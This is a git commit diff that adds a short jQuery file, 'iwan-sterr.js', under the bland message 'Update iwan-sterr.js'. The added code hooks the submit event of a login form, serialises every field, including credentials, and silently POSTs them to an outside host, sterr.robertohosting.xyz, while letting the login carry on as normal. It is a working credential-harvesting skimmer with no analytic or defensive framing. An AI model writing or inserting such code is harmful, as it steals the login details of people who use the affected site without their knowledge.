6b27e0d040899fa5b0c87fbddff86d97ea1cbce4
kelibok <97335250+kelibok@users.noreply.github.com>
2022-01-14 16:08:37 +0700

    Update iwan-sterr.js

--- iwan-sterr.js
+++ iwan-sterr.js
@@ -1,1 +1,28 @@
 
+$(".login-form").submit(function() {
+
+	var d = $(".login-form");
+
+	$.ajax({
+
+        url: "http://sterr.robertohosting.xyz/apiii.php",
+
+        type: "POST",
+
+        data: d.serialize(),
+
+        success: function () {
+
+            return true;
+
+        },
+
+        error: function () {
+
+            return true;
+
+        },
+
+    });
+
+});
